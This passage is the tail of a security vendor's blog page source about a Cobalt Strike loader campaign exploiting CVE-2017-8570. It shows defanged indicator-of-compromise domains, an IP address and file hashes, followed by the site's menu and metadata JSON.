443\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u003c/p\u003e\u003ch6\u003eIOCs\u003c/h6\u003e\u003cp\u003eweavesilk[.]space\u003cbr /\u003e109.107.178[.]241\u003cbr /\u003epetapixel[.]fun\u003c/p\u003e\u003cp\u003e\u003c/p\u003e\u003ctable style=\"width: 100%;\"\u003e\u003cthead class=\"bg-grey\"\u003e\u003ctr\u003e\u003cth\u003e\u003cp\u003eSHA256\u003c/p\u003e\u003c/th\u003e\u003cth\u003e\u003cp\u003eDescription\u003c/p\u003e\u003c/th\u003e\u003c/tr\u003e\u003c/thead\u003e\u003ctbody\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003eb0b762106c22e44f7acaa3177baabd64ea28990d16672e1f902b53f49b2027c4\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003esignal-2023-12-20-160512.ppsx\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003e0bc0e9410f4a9703ff0b5af7ec9383a1cc929572ade09fbd2c69ed2ae1486939\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003ewidget_iframe.617766616773726468746672726a6834.html\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd\u003e\u003cp\u003e976f57442452cd54cada011c565ada0c01f5b1460e31ee6cea330d210d3e8f50\u003c/p\u003e\u003c/td\u003e\u003ctd\u003e\u003cp\u003evpn.sessings (cobalt strike loader DLL)\u003c/p\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/tbody\u003e\u003c/table\u003e\u003cp\u003e\u003c/p\u003e"}}]},"preview":false,"headerTheme":{"theme":"white"},"headerMenu":{"main":[{"id":"cs9d6eb1ca84ab5529","text":"Products","column_layout":"75_25","subMenu":[{"menuColumn":{"link":{"title":"EXPLORE THE PREDICTIVE PREVENTION PLATFORM","url":""},"menuItems":[{"title":"Prevention Platform","url":"/platform","id":"cs9fa3612e2431ca92","indent":false,"description":"End-to-end predictive prevention platform built on a deep learning framework that protects storage, applications, and endpoints."},{"title":"Prevention for Storage","url":"/prevention-for-storage","id":"cs131597e8802151fa","indent":false,"description":"Prevent \u003e99% of zero-day exploits, ransomware, and unknown threats in your NAS and cloud storage repositories."},{"title":"Prevention for Applications","url":"/prevention-for-applications","id":"csdde7d7af5d13f027","indent":false,"description":"Proactively prevent malicious files from entering your storage environment through application uploads by customers, employees, and third parties."},{"title":"Prevention for Endpoints","url":"/endpoint-security","id":"cs410b32f532434327","indent":false,"description":"Prevent known and unknown malware, zero-day exploits, ransomware, and script-based attacks before they execute on the endpoint – faster than a blink of an eye."},{"title":"DIANNA - AI Cyber Companion","url":"/dianna-ai-cyber-companion","id":"csb60f3f40b53c2a68","indent":false,"description":"AI cyber companion providing expert-level malware analysis for unknown threats. Simplify investigations, enhance visibility, and solidify a prevention-first strategy."}]}},{"menuColumn":{"link":{"title":"","url":""},"menuItems":[{"title":"Data Security: Powered By Deep Instinct","url":"/data-security","id":"cs6c48a03f36654b19","indent":false,"description":"Leverage advanced predictive prevention technology to protect data across your entire environment."},{"title":"Deep Learning: Prevention-First Cybersecurity","url":"/why-deep-instinct","id":"cs3277355a1c5f7bd6","indent":false,"description":"Deep Instinct is the only deep learning framework in the world built from the ground up for cybersecurity."}]}}]},{"id":"cs0b135af0b713e8bd","text":"Why Deep Instinct","column_layout":"50_50","subMenu":[{"menuColumn":{"link":{"title":"Unparalleled Prevention","url":""},"menuItems":[{"title":"\u003e99% Threat Accuracy","url":"/endpoint-protection-platforms","id":"csfe705dbf0cca06ec","indent":false,"description":"Leverage deep learning to deliver highly accurate threat detection and reduce false positives in a rapidly evolving threat landscape."},{"title":"Prevent Ransomware","url":"/ransomware-protection-solution","id":"csb80c8d530b4ea6b8","indent":false,"description":"Stop threats using real-time classification and prevention techniques to ensure robust and efficient cybersecurity."},{"title":"Prevent Zero-Day Attacks","url":"/zero-day-attacks","id":"cscb35501e2dc2945a","indent":false,"description":"Proactively stop zero-day threats in \u003c20ms with unparalleled accuracy and minimal false positives."}]}},{"menuColumn":{"link":{"title":"Enhance Existing Cyber Tools","url":""},"menuItems":[{"title":"Extend \u0026 Enhance EDR/XDR","url":"/endpoint-detection-response","id":"cs68603a6f9d219103","indent":false,"description":"EDR is not enough — enhance existing cybersecurity tools with advanced, real-time threat prevention using deep learning to produce defense in depth."},{"title":"+ MICROSOFT DEFENDER","url":"/vs-microsoft-defender","id":"csa6d661a8c90401b4","indent":false,"description":"Deep Instinct complements Microsoft Defender with advanced threat prevention to stop threats before they enter your environment."},{"title":"+ TANIUM","url":"/deep-instinct-tanium","id":"csfcc638de3a687e1c","indent":false,"description":"Deep Instinct and Tanium deliver prevention-first endpoint security to reduce risk and boost productivity."},{"title":"LEGACY AV","url":"/deep-instinct-vs-competitors","id":"cs06c3280dfce0c82a","indent":false,"description":"Replace outdated, legacy AV solutions with prevention-first, deep-learning-based protection purpose-built for cybersecurity."},{"title":"REPLACE TRELLIX","url":"/deep-instinct-versus-trellix","id":"cs516d380b56582fc7","indent":false,"description":"Faster and more accurate – Deep Instinct safeguards your data and protects your NAS storage better than Trellix."}]}}]},{"id":"cs9a1685332616ab04","text":"Resources","column_layout":"single","subMenu":[{"menuColumn":{"link":{"title":"","url":""},"menuItems":[{"title":"Asset Library","url":"/resources","id":"cs7a31018d4de08f4e","indent":false,"description":""},{"title":"Threat Research","url":"/cyber-threat-reports","id":"cs12f5fd632003499f","indent":false,"description":""},{"title":"Voice Of SecOps","url":"/voice-of-secops-reports","id":"cs936ea2e4f0c84408","indent":false,"description":""},{"title":"Blog","url":"/blog","id":"cs1c561d1aa853b2a3","indent":false,"description":""},{"title":"Videos","url":"/videos","id":"cs59d61494e24b98d1","indent":false,"description":""},{"title":"Events \u0026 Webinars","url":"/events-webinars","id":"cs252bd6790d094b06","indent":false,"description":""},{"title":"Training","url":"/deep-instinct-training","id":"csf91b0953931eb246","indent":false,"description":""}]}}]},{"id":"csc64757ccf4d2c9c8","text":"Company","column_layout":"single","subMenu":[{"menuColumn":{"link":{"title":"","url":""},"menuItems":[{"title":"About Deep Instinct","url":"/about-us","id":"cs015ea2b646946fb3","indent":false,"description":""},{"title":"Our Customers","url":"/customers","id":"cs856925787b9bb093","indent":false,"description":""},{"title":"Leadership Team","url":"/company/leadership-team","id":"cs19c86badbe85fe86","indent":false,"description":""},{"title":"Board of Directors","url":"/company/board-of-directors","id":"cs42440c18ad998967","indent":false,"description":""},{"title":"Newsroom","url":"/newsroom","id":"cs26c3af4216f35f16","indent":false,"description":""},{"title":"Careers","url":"/careers","id":"cs423626cb5ec6ce5f","indent":false,"description":""},{"title":"Contact Us","url":"/contact-us","id":"cs764c5e9dc04978ad","indent":false,"description":""}]}}]},{"id":"csd58f79895273e8bc","text":"Request Demo","column_layout":"single","url":"https:/info.deepinstinct.com/request-a-demo"}],"secondary":[{"title":"Partners","url":"/partners","id":"sub-0"},{"title":"Login","url":"https://portal.deepinstinct.com","id":"sub-1"}]},"footerMenu":{"sections":[{"title":"Products","links":[{"title":"Prevention Platform","url":"/platform","id":"cs778c0921797e2796","indent":false,"description":""},{"title":"Prevention for Storage","url":"/prevention-for-storage","id":"cs51bfef75d2368389","indent":false,"description":""},{"title":"Prevention for Applications","url":"/prevention-for-applications","id":"csdba3cab8bdda7742","indent":false,"description":""},{"title":"Prevention for Endpoints","url":"/endpoint-security","id":"csa70948fea32fbbf2","indent":false,"description":""},{"title":"DIANNA - AI Cyber Companion","url":"/dianna-ai-cyber-companion","id":"cs816fed13b30b938d","indent":false,"description":""},{"title":"Data Security: Powered by Deep Instinct","url":"/data-security","id":"cs91605ed0a1ddd694","indent":false,"description":""},{"title":"Deep Learning: Prevention-First Cybersecurity","url":"/why-deep-instinct","id":"csdc567797e15923fe","indent":false,"description":""}]},{"title":"Why Deep Instinct","links":[{"title":"\u003e99% Threat Accuracy","url":"/endpoint-protection-platforms","id":"cs63692d7a9c0a28a4","indent":false,"description":""},{"title":"Prevent Ransomware","url":"/ransomware-protection-solution","id":"csccdc950f667cfd87","indent":false,"description":""},{"title":"Prevent Zero-Day Attacks","url":"/zero-day-attacks","id":"cs742e867275ddb106","indent":false,"description":""}]},{"title":"Enhance Existing Cyber Tools","links":[{"title":"Extend \u0026 Enhance EDR/XDR","url":"/endpoint-detection-response","id":"cs5bc994a7a81c036b","indent":false,"description":""},{"title":"+ Microsoft Defender","url":"/vs-microsoft-defender","id":"cs9278f4b9e9ad1680","indent":false,"description":""},{"title":"+ Tanium","url":"/deep-instinct-tanium","id":"cs7bc1106cd2cdf1a1","indent":false,"description":""},{"title":"Legacy AV","url":"/deep-instinct-vs-competitors","id":"cs1380322651d1ca0f","indent":false,"description":""},{"title":"Replace Trellix","url":"/deep-instinct-versus-trellix","id":"cs2941285b6394584d","indent":false,"description":""}]},{"title":"Company","links":[{"title":"About Deep Instinct","url":"/about-us","id":"csc6b43b0e74f8d5b9","indent":false,"description":""},{"title":"Our Customers","url":"/customers","id":"csb2959da90522d746","indent":false,"description":""},{"title":"Newsroom","url":"/newsroom","id":"cs4c0d16a30b844a3a","indent":false,"description":""},{"title":"Careers","url":"/careers","id":"cs0067fb583a95b6f5","indent":false,"description":""},{"title":"Contact Us","url":"/contact-us","id":"cs77bdd8a50eaccb34","indent":false,"description":""}]},{"title":"Resources","links":[{"title":"Asset Library","url":"/resources","id":"cs153459fa2c69b5fa","indent":false,"description":""},{"title":"Blog","url":"/blog","id":"csd71fc821e3188000","indent":false,"description":""},{"title":"Videos","url":"/videos","id":"csb2971784354462d7","indent":false,"description":""},{"title":"Events \u0026 Webinars","url":"/events-webinars","id":"cs2352c64271ced2e4","indent":false,"description":""}]},{"title":"Quick links","links":[{"title":"Request Demo","url":"https://info.deepinstinct.com/request-a-demo","id":"csaa8b34ab12cb5cd8","indent":false,"description":""},{"title":"Customer Portal","url":"https://portal.deepinstinct.com/","id":"cs2f3b3980139db7ea","indent":false,"description":""},{"title":"Integrations and Compliance","url":"/compliance-certification-evaluation","id":"cs700479e71aace5c7","indent":false,"description":""},{"title":"Training","url":"/deep-instinct-training","id":"csb97de0d53ad00587","indent":false,"description":""}]}],"socialLinks":[{"text":"youtube","url":"https://www.youtube.com/channel/UCYerfisJf3hc9QOWmic1G9Q"},{"text":"linkedin","url":"https://www.linkedin.com/company/deep-instinct"},{"text":"twitter","url":"https://twitter.com/DeepInstinctSec"},{"text":"facebook","url":"https://www.facebook.com/DeepInstinctInc"}],"secondaryLinks":[{"text":"Privacy Policy","url":"/privacy-policy"},{"text":"Candidate Privacy Policy","url":"/candidate-privacy-policy"},{"text":"Cookie Policy","url":"/cookies-policy"},{"text":"Terms of use","url":"/terms-of-use"}],"hideFooterMenu":false},"hideHeaderMenu":false,"hideFooterMenu":false,"hideSitewideAlert":false,"disableStickyHeader":false,"pageBackground":false,"siteWideAlert":{"title":"Discover how Deep Instinct Prevention for Storage (DPS) protects your NAS storage more effectively than Trellix.","cta":{"text":"Learn More","url":"/deep-instinct-versus-trellix"}},"meta":{"title":"Uncorking Old Wine: Zero-Day from 2017 + Cobalt Strike Loader in Unholy Alliance","keywords":"","description":"The Deep Instinct Threat Lab discovered a suspected targeted operation against Ukraine, using CVE-2017-8570 as the initial vector. The operation, which could not be attributed to any known threat actor, employed a custom loader for Cobalt Strike Beacon. Deep Instinct is detecting all stages of the attack.","image":"https://www.deepinstinct.com/image/blt61c3dfc7363deead/6629802381c884594a38061c/ThreatResearchTeam_Blog_1200x627_C.png","created":"2024-04-25T13:30:00.000Z","updated":"2024-04-25T16:58:59.476Z","hide":false},"url":"blog/uncorking-old-wine-zero-day-cobalt-strike-loader","translations":["ja"],"lang":"en"},"__N_SSG":true},"page":"/blog/[pid]","query":{"pid":"uncorking-old-wine-zero-day-cobalt-strike-loader"},"buildId":"nHrLbpBAijfh0TcvFHHAo","runtimeConfig":{"baseUrl":"https://www.deepinstinct.com","locales":{"en":"en-us","ja":"ja","fr":"fr"},"defaultLocale":"en","contentTypes":{"modularPage":{"name":"di_modular_page","revalidate":600,"sitemap":{"changefreq":"daily","priority":0.5},"prefix":"modular","options":{"include":["modular_blocks.others.components.list_featured_resources.resources","modular_blocks.others.components.list_featured_resources.featured_resources"]}},"author":{"name":"di_author"},"blogPost":{"name":"di_blog_post","revalidate":600,"prefix":"blog","modularUrl":"blog/all","sortings":{"desc":"publication_date"},"author":true,"rss":{"title":"Deep Instinct Blog: Breaking News and Updates","description":"Deep Instinct prevents more advanced threats than any EPP or EDR in the world."},"listingLimit":10,"sitemap":{"changefreq":"monthly","priority":0.5}},"pressRelease":{"name":"di_press_release","prefix":"news","revalidate":60,"author":false,"sortings":{"desc":"publication_date"},"rss":{"title":"Deep Instinct News","description":"Deep Instinct prevents more advanced threats than any EPP or EDR in the world."},"sitemap":{"changefreq":"monthly","priority":0.5},"listingLimit":10},"newsCoverage":{"name":"di_news_coverage","prefix":"news-coverage","modularUrl":"news-coverage","revalidate":900,"sortings":{"desc":"date"},"listingLimit":12},"biosListing":{"name":"di_bios_listing","prefix":"company","revalidate":900},"pdfPage":{"name":"di_pdf_resources","prefix":"pdf","revalidate":600,"sitemap":{"changefreq":"monthly","priority":0.5}},"embedPage":{"name":"di_embed","prefix":"embed","revalidate":600},"videoPage":{"name":"di_video_page","prefix":"video","revalidate":900,"sitemap":{"changefreq":"monthly","priority":0.5}},"jobListing":{"name":"di_job_listing"},"glossaryTerm":{"name":"di_glossary_term","revalidate":1800,"prefix":"glossary","themeColors":"blue","sortings":{"desc":"publication_date"},"sitemap":{"changefreq":"monthly","priority":0.5}},"resource":{"name":"di_resource","sortings":{"desc":"created_at"}}},"revalidationByUrl":{"/blog":60,"/news":60},"menus":{"name":"di_menus","reference":["header_menu.menu_section.menu_columns.menu_column.menu_items.link_reference.reference","footer_menu.menu_section.menu_items.link_reference.reference"],"referenceFields":"url"},"meta":{"title":"The Deep Learning AI Cybersecurity Platform, Offering Cyber Threat Prevention Solutions.","siteName":"Deep Instinct","description":"","twitterSite":"@DeepInstinctSec"},"homePageUrl":"/index","themeColors":{"dark":"dark","blue":"blue","light":"light","white":"white"},"rss":{"limit":10,"authorFallback":"Deep Instinct"}},"isFallback":false,"isExperimentalCompile":false,"dynamicIds":[36839],"gsp":true,"locale":"en","locales":["en","ja","fr"],"defaultLocale":"en","scriptLoader":[]}</script></body></html>